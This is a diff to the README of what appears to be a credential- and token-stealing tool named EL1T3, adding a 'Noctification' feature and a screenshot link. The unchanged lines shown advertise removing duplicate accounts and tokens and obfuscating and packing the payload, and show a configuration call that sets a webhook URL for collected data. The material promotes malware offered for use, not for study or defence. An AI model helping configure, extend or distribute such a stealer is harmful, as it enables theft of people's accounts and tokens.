@@ -16,6 +16,7 @@
 - Remove Duplicate account / token
 - Obfuscate and pack payload
 - Easy to use
+- Noctification
 
 <h1 align="center">HOW TO INSTALL</h1>
 
@@ -57,3 +58,8 @@ EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_u
 
 <h1 align="center">DATABASE SCREENSHOT</h1>
 <img align="center" src="https://media.discordapp.net/attachments/823351707110473789/823356873637494794/unknown.png">
+
+#
+
+<h1 align="center">DATABASE NOCTIFICATION</h1>
+<img align="center" src="https://media.discordapp.net/attachments/795615135011831828/823969770587684965/unknown.png">
